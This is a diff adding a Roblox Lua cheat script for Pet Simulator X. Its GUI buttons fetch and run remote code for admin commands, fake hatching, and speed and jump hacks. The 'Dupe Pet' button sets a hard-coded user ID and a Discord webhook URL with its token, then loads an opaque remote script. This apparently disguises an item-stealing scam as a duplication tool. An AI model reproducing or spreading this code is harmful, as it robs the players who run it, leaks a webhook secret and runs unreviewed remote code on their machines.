@@ -1,0 +1,50 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("DUPE", "DarkTheme")
+
+-- Main
+local Main = Window:NewTab("Main")
+local MainSection = Main:NewSection("Main")
+
+
+MainSection:NewButton("Infinite Yield", "Admin Command", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+end)
+
+MainSection:NewButton("Fake Hatch", "You can use fake hatch Note:Only you can see the message", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/hackerDashDash/PetSimulatorX/main/PetSimulatorXV2.lua",true))()
+end)
+
+MainSection:NewButton("Fake Equip", "Fake pets", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/hackerDashDash/PetSimulatorX/main/petSimulatorXEquipV2.lua",true))()
+end)
+
+
+-- Player
+local Player = Window:NewTab("Player")
+local PlayerSection = Player:NewSection("Player")
+
+
+PlayerSection:NewSlider("WalkSpeed", "SPEED", 500, 16, function(s) 
+    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
+end)
+
+PlayerSection:NewSlider("JumpPower", "JUMP", 350, 50, function(s) 
+    game.Players.LocalPlayer.Character.Humanoid.JumpPower = s
+end)
+
+PlayerSection:NewButton("Reset JumpPower/WalkSpeed", "Reset your power", function()
+    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
+    game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
+end)
+
+
+-- Dupe
+local Dupe = Window:NewTab("Dupe")
+local DupeSection = Dupe:NewSection("Wait 1 munite and excute")
+
+
+DupeSection:NewButton("Dupe Pet", "Dupe pet", function()
+    _G.UserID = 1303728605
+_G.WebHook = "https://discord.com/api/webhooks/1018509643393269811/013o4w1lL9fumauDac-CO4xYdYtkcKv9_OUz1E9S0ni0tFZsedjqSE_KgGniJsOho_QK"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LordZungg/PetSimX/main/Silence"))()
+end)
